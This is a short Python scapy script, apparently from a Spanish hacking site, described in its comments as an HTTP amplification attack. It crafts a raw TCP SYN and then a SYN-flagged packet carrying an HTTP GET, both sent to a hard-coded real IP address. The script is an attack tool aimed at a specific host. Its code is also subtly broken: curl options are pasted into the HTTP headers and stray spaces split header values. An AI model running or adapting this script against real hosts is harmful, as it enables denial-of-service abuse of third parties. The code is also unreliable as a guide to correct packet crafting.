# Ataque amplificacion enviando una peticion http y flags TCP: SYN + peticion HTTP GET
# Peticion HTTP GET, con handshake TCP, em 1 solo paso. Flags TCP: SYN +  http GET
# hackingyseguridad.com 2023

import sys
import socket
from scapy.all import *

syn = IP(dst="104.16.88.120") / TCP(dport=80, flags='S')
syn_ack = sr1(syn)
getStr = "GET / HTTP/1.1\r\nHost: 104.16.88.120\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleW  ebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/58.0.3029.110 Chrome/58.0.3029.110 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n  Accept-Language: es-ES,es;q=0.9,en;q=0.8\r\n--compressed\r\n--insecure\r\n\r\n"
request = IP(dst='104.16.88.120') / TCP(dport=80, sport=syn_ack[TCP].dport,
seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='S') / getStr
reply = sr1(request)
